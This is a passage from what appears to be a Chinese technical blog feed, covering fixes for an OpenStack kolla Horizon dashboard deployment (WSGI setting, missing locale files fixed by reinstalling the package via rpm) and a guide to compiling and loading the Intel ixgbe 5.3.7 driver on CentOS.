WSGIProcessGroup horizon-http</span><br><span class="line"><span class="addition">+   WSGIApplicationGroup %&#123;GLOBAL&#125;</span></span><br></pre></td></tr></table></figure><p>为了使 clean 之后还能使用，还需要修改以下部分</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /usr/share/kolla/ansible/roles/horizon/templates/horizon.conf.j2</span><br><span class="line"></span><br><span class="line">    WSGIScriptReloading On</span><br><span class="line">    WSGIDaemonProcess horizon-http processes=5 threads=1 user=horizon group=horizon display-name=%&#123;GROUP&#125; python-path=&#123;&#123; python_path &#125;&#125;</span><br><span class="line">    WSGIProcessGroup horizon-http</span><br><span class="line"><span class="addition">+   WSGIApplicationGroup %&#123;GLOBAL&#125;</span></span><br></pre></td></tr></table></figure><h2 id="验证-2"><a href="#验证-2" class="headerlink" title="验证"></a>验证</h2><p>重启容器后验证 dashboard 能否打开</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># docker restart horizon</span></span><br></pre></td></tr></table></figure><p><img data-src="/images/uploads/2018/07/dashboard.jpg"></p><h1 id="问题七-dashboard-登陆报错"><a href="#问题七-dashboard-登陆报错" class="headerlink" title="问题七: dashboard 登陆报错"></a>问题七: dashboard 登陆报错</h1><h2 id="问题描述-6"><a href="#问题描述-6" class="headerlink" title="问题描述"></a>问题描述</h2><p>可以正常打开 dashboard 了，但是登陆后有如下错误<br><img data-src="/images/uploads/2018/07/error.jpg"></p><h2 id="排查问题-2"><a href="#排查问题-2" class="headerlink" title="排查问题"></a>排查问题</h2><h3 id="1-查看-dashboard-日志-1"><a href="#1-查看-dashboard-日志-1" class="headerlink" title="1. 查看 dashboard 日志"></a>1. 查看 dashboard 日志</h3><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"># docker exec -it heka bash</span><br><span class="line"></span><br><span class="line">(heka)[heka@allinone /]$ tail <span class="number">-50</span>f /var/log/kolla/horizon/horizon.log</span><br><span class="line">……</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368340</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]   <span class="symbol">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/django/template/base.py&quot;</span>, line <span class="number">905</span>, in render</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368353</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]     bit = self.render_node(node, context)</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368373</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]   <span class="symbol">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/django/template/base.py&quot;</span>, line <span class="number">919</span>, in render_node</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368387</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]     return node.render(context)</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368399</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]   <span class="symbol">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/django/templatetags/i18n.py&quot;</span>, line <span class="number">145</span>, in render</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368412</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]     result = translation.ungettext(singular, plural, count)</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368425</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]   <span class="symbol">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/django/utils/translation/__init__.py&quot;</span>, line <span class="number">88</span>, in ungettext</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368438</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]     return <span class="symbol">_trans</span>.ungettext(singular, plural, number)</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368451</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]   <span class="symbol">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/django/utils/translation/trans_real.py&quot;</span>, line <span class="number">381</span>, in ungettext</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368464</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]     return do_ntranslate(singular, plural, number, <span class="string">&#x27;ungettext&#x27;</span>)</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368506</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]   <span class="symbol">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/django/utils/translation/trans_real.py&quot;</span>, line <span class="number">358</span>, in do_ntranslate</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368550</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]     return getattr(t, translation_function)(singular, plural, number)</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368571</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]   <span class="symbol">File</span> <span class="string">&quot;/usr/lib64/python2.7/gettext.py&quot;</span>, line <span class="number">411</span>, in ungettext</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368585</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>]     tmsg = self.<span class="symbol">_catalog</span>[(msgid1, self.plural(n))]</span><br><span class="line">[<span class="symbol">Mon</span> <span class="symbol">Jul</span> <span class="number">16</span> <span class="number">09</span>:<span class="number">29</span>:<span class="number">07.368597</span> <span class="number">2018</span>] [:error] [pid <span class="number">19</span>] <span class="symbol">AttributeError</span>: <span class="symbol">DjangoTranslation</span> instance has no attribute <span class="string">&#x27;plural&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="2-查看-dashboard-国际化文件夹"><a href="#2-查看-dashboard-国际化文件夹" class="headerlink" title="2. 查看 dashboard 国际化文件夹"></a>2. 查看 dashboard 国际化文件夹</h3><p>发现中文等目录中内容都为空，对比正常环境得知此目录中应该有 LC_MESSAGES 文件，用于生成国际化文件。</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># docker exec -it horizon bash</span><br><span class="line"></span><br><span class="line">(horizon)[root@allinone ~]# ls <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/openstack_dashboard/</span>locale/zh_CN</span><br></pre></td></tr></table></figure><h3 id="3-启动容器，模拟-horizon-镜像的生成"><a href="#3-启动容器，模拟-horizon-镜像的生成" class="headerlink" title="3. 启动容器，模拟 horizon 镜像的生成"></a>3. 启动容器，模拟 horizon 镜像的生成</h3><p>以 kolla/centos-binary-openstack-base:2.0.4 为镜像创建一个容器</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># docker run -it kolla<span class="regexp">/centos-binary-openstack-base:2.0.4 /</span>bin/bash</span><br></pre></td></tr></table></figure><p>在其中执行安装生成 horizon 镜像的操作</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># vim <span class="regexp">/usr/</span>share<span class="regexp">/kolla/</span>docker<span class="regexp">/horizon/</span>Dockerfile.j2</span><br><span class="line"></span><br><span class="line">RUN yum -y install \</span><br><span class="line">        openstack-dashboard \</span><br><span class="line">        httpd \</span><br><span class="line">        mod_wsgi \</span><br><span class="line">        <span class="keyword">gettext</span> \</span><br><span class="line">    &amp;&amp; yum clean all \</span><br><span class="line">    &amp;&amp; useradd --user-<span class="keyword">group</span> horizon \</span><br><span class="line">    &amp;&amp; sed -i -r <span class="string">&#x27;s,^(Listen 80),#\1,&#x27;</span> <span class="regexp">/etc/</span>httpd<span class="regexp">/conf/</span>httpd.conf \</span><br><span class="line">    &amp;&amp; ln -s <span class="regexp">/usr/</span>share<span class="regexp">/openstack-dashboard/</span>openstack_dashboard <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages/openstack_dashboard \</span><br><span class="line">    &amp;&amp; ln -s <span class="regexp">/usr/</span>share<span class="regexp">/openstack-dashboard/</span><span class="keyword">static</span> <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages/<span class="keyword">static</span> \</span><br><span class="line">    &amp;&amp; chown -R horizon: <span class="regexp">/etc/</span>openstack-dashboard <span class="regexp">/usr/</span>share/openstack-dashboard \</span><br><span class="line">    &amp;&amp; chown -R apache: <span class="regexp">/usr/</span>share<span class="regexp">/openstack-dashboard/</span><span class="keyword">static</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>最终发现在执行了第一步安装 openstack-dashboard 后就没有在 /usr/share/openstack-dashboard/openstack_dashboard/locale 目录中生成对应的 LC_MESSAGES 文件</p><h3 id="4-使用-rpm-命令安装"><a href="#4-使用-rpm-命令安装" class="headerlink" title="4. 使用 rpm 命令安装"></a>4. 使用 rpm 命令安装</h3><p>直接使用 rpm 安装可以生成对应的国际化文件</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">()[root@e06f6d94adba ~]# yum remove openstack-dashboard -y</span><br><span class="line">()[root@e06f6d94adba ~]# rpm -ivh  http:<span class="comment">//mirror.neu.edu.cn/centos/7/cloud/x86_64/openstack-mitaka/openstack-dashboard-9.0.1-1.el7.noarch.rpm</span></span><br><span class="line">()[root@e06f6d94adba ~]# ls <span class="regexp">/usr/</span>share<span class="regexp">/openstack-dashboard/</span>openstack_dashboard<span class="regexp">/locale/</span>zh_CN/</span><br><span class="line">LC_MESSAGES</span><br></pre></td></tr></table></figure><h3 id="5-修改-horizon-的-dockerfile"><a href="#5-修改-horizon-的-dockerfile" class="headerlink" title="5. 修改 horizon 的 dockerfile"></a>5. 修改 horizon 的 dockerfile</h3><p>先用 yum 安装 openstack-dashboard，解决依赖问题。在删除，使用 rpm 安装 openstack-dashboard</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /usr/share/kolla/docker/horizon/Dockerfile.j2</span><br><span class="line"></span><br><span class="line">RUN yum -y install \</span><br><span class="line">        openstack-dashboard \</span><br><span class="line">        httpd \</span><br><span class="line">        mod_wsgi \</span><br><span class="line">        gettext \</span><br><span class="line"><span class="addition">+   &amp;&amp; rpm -e  openstack-dashboard &amp;&amp; rm -rf /etc/openstack-dashboard/local_settings.rpmsave \</span></span><br><span class="line"><span class="addition">+   &amp;&amp; rpm -ivh  http://mirror.neu.edu.cn/centos/7/cloud/x86_64/openstack-mitaka/openstack-dashboard-9.0.1-1.el7.noarch.rpm \</span></span><br><span class="line">    &amp;&amp; yum clean all \</span><br></pre></td></tr></table></figure><h3 id="6-重新-build-horizon镜像"><a href="#6-重新-build-horizon镜像" class="headerlink" title="6. 重新 build horizon镜像"></a>6. 重新 build horizon镜像</h3><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line"># kolla-build --<span class="built_in">base</span> centos -<span class="built_in">t</span> binary horizon</span><br></pre></td></tr></table></figure><h2 id="验证-3"><a href="#验证-3" class="headerlink" title="验证"></a>验证</h2><p>重新 deploy 后，dashboard 可以正常打开，登陆后可以正常显示<br><img data-src="/images/uploads/2018/07/normal.png"></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> openstack </tag>
            
            <tag> kolla </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 编译安装 ixgbe-5.3.7</title>
      <link href="linux/update-ixgbe-on-centos.html"/>
      <url>linux/update-ixgbe-on-centos.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1. 安装依赖"></a>1. 安装依赖</h2><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install gcc kernel-header kernel-devel</span></span><br></pre></td></tr></table></figure><h2 id="2-解压源码并编译"><a href="#2-解压源码并编译" class="headerlink" title="2. 解压源码并编译"></a>2. 解压源码并编译</h2><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># tar zxvf ixgbe-5.3.7.tar.gz</span></span><br><span class="line"><span class="meta"># cd ixgbe-5.3.7/src/</span></span><br><span class="line"><span class="meta"># make </span></span><br></pre></td></tr></table></figure><p>此时还是有以下错误</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment"># make</span></span><br><span class="line">common.mk:<span class="number">102</span>: *** Kernel header <span class="built_in">files</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="keyword">any</span> <span class="keyword">of</span> <span class="keyword">the</span> expected locations.</span><br><span class="line">common.mk:<span class="number">103</span>: *** Install <span class="keyword">the</span> appropriate kernel development package, e.g.</span><br><span class="line">common.mk:<span class="number">104</span>: *** kernel-devel, <span class="keyword">for</span> building kernel modules <span class="keyword">and</span> <span class="keyword">try</span> again.  Stop.</span><br></pre></td></tr></table></figure><p>打开 common.mk 发现编译时需要 /usr/src/linux 目录，但是系统并没有此目录，手动创建 /usr/src/kernels/3.10.0-862.6.3.el7.x86_64/ 到 /usr/src/linux 的链接即可</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># ln -s <span class="regexp">/usr/</span>src<span class="regexp">/kernels/</span><span class="number">3.10</span>.<span class="number">0</span>-<span class="number">862.6</span>.<span class="number">3</span>.el7.x86_64<span class="regexp">/ /u</span>sr<span class="regexp">/src/</span>linux</span><br></pre></td></tr></table></figure><span id="more"></span><p>重新编译</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># make </span></span><br><span class="line">make[<span class="number">1</span>]: Entering directory `<span class="meta-keyword">/usr/</span>src<span class="meta-keyword">/kernels/</span><span class="number">3.10</span><span class="number">.0</span><span class="number">-862.6</span><span class="number">.3</span>.el7.x86_64&#x27;</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_main.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_api.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_common.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_dcb.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_dcb_82598.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_dcb_82599.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_ethtool.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_lib.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_mbx.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_sriov.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_param.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_phy.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_procfs.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_82598.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_82599.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_x540.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_x550.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_dcb_nl.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_debugfs.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_fcoe.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_ptp.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe_sysfs.o</span><br><span class="line">  CC [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>kcompat.o</span><br><span class="line">  LD [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe.o</span><br><span class="line">  Building modules, stage <span class="number">2.</span></span><br><span class="line">  MODPOST <span class="number">1</span> modules</span><br><span class="line">  CC      <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe.mod.o</span><br><span class="line">  LD [M]  <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>ixgbe.ko</span><br><span class="line">make[<span class="number">1</span>]: Leaving directory `<span class="meta-keyword">/usr/</span>src<span class="meta-keyword">/kernels/</span><span class="number">3.10</span><span class="number">.0</span><span class="number">-862.6</span><span class="number">.3</span>.el7.x86_64&#x27;</span><br></pre></td></tr></table></figure><p>查看编译后驱动信息</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># modinfo ./ixgbe.ko</span></span><br><span class="line"><span class="symbol">filename:</span>       <span class="meta-keyword">/root/</span>ixgbe<span class="number">-5.3</span><span class="number">.7</span><span class="meta-keyword">/src/</span>./ixgbe.ko</span><br><span class="line"><span class="symbol">version:</span>        <span class="number">5.3</span><span class="number">.7</span></span><br><span class="line"><span class="symbol">license:</span>        GPL</span><br><span class="line"><span class="symbol">description:</span>    Intel(R) <span class="number">10</span>GbE PCI Express Linux Network Driver</span><br><span class="line"><span class="symbol">author:</span>         Intel Corporation, <span class="params">&lt;linux.nics@intel.com&gt;</span></span><br><span class="line"><span class="symbol">retpoline:</span>      Y</span><br><span class="line"><span class="symbol">rhelversion:</span>    <span class="number">7.5</span></span><br><span class="line"><span class="symbol">srcversion:</span>     <span class="number">9E1</span>B3824190E963083DADF5</span><br><span class="line">…………</span><br></pre></td></tr></table></figure><h2 id="3-加载驱动"><a href="#3-加载驱动" class="headerlink" title="3. 加载驱动"></a>3. 加载驱动</h2><p>如果系统已经安装 ixgbe 驱动要先卸载</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rmmod ixgbe.ko</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lsmod | grep ixgbe</span></span><br><span class="line"><span class="attribute">ixgbevf</span>                <span class="number">62069</span>  <span class="number">0</span> </span><br></pre></td></tr></table></figure><p>加载ixgbe驱动</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># insmod ./ixgbe.ko</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lsmod | grep ixgbe</span></span><br><span class="line"><span class="attribute">ixgbe</span>                 <span class="number">329961</span>  <span class="number">0</span> </span><br><span class="line"><span class="attribute">ixgbevf</span>                <span class="number">62069</span>  <span class="number">0</span> </span><br><span class="line"><span class="attribute">dca</span>                    <span class="number">15130</span>  <span class="number">2</span> ixgbe,ioatdma</span><br><span class="line"><span class="attribute">ptp</span>                    <span class="number">19231</span>  <span class="number">2</span> tg<span class="number">3</span>,ixgbe</span><br></pre></td></tr></table></figure><p>使用 dmesg 验证驱动是否加载成功</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">dmesg</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[681507.970884]</span> <span class="selector-tag">Intel</span>(R) <span class="selector-tag">10GbE</span> <span class="selector-tag">PCI</span> <span class="selector-tag">Express</span> <span class="selector-tag">Linux</span> <span class="selector-tag">Network</span> <span class="selector-tag">Driver</span> <span class="selector-tag">-</span> <span class="selector-tag">version</span> <span class="selector-tag">5</span><span class="selector-class">.3</span><span class="selector-class">.7</span></span><br><span class="line"><span class="selector-attr">[681507.970886]</span> <span class="selector-tag">Copyright</span>(c) <span class="selector-tag">1999</span> <span class="selector-tag">-</span> <span class="selector-tag">2018</span> <span class="selector-tag">Intel</span> <span class="selector-tag">Corporation</span>.</span><br><span class="line"><span class="selector-attr">[681507.989690]</span> <span class="selector-tag">ixgbe</span>: <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">ixgbe_check_options</span>: <span class="selector-tag">FCoE</span> <span class="selector-tag">Offload</span> <span class="selector-tag">feature</span> <span class="selector-tag">enabled</span></span><br><span class="line"><span class="selector-attr">[681508.138527]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">95</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138537]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">96</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138549]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">97</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138557]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">98</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138569]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">99</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138577]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">100</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138589]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">101</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138597]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">102</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138609]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">103</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138616]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">104</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138624]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">105</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138632]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">106</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138640]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">107</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138648]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">108</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138656]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">109</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138664]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">110</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138671]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">111</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span class="selector-tag">MSI-X</span></span><br><span class="line"><span class="selector-attr">[681508.138679]</span> <span class="selector-tag">ixgbe</span> <span class="selector-tag">0000</span>:<span class="selector-tag">05</span>:<span class="selector-tag">00</span><span class="selector-class">.0</span>: <span class="selector-tag">irq</span> <span class="selector-tag">112</span> <span class="selector-tag">for</span> <span class="selector-tag">MSI</span>/<span 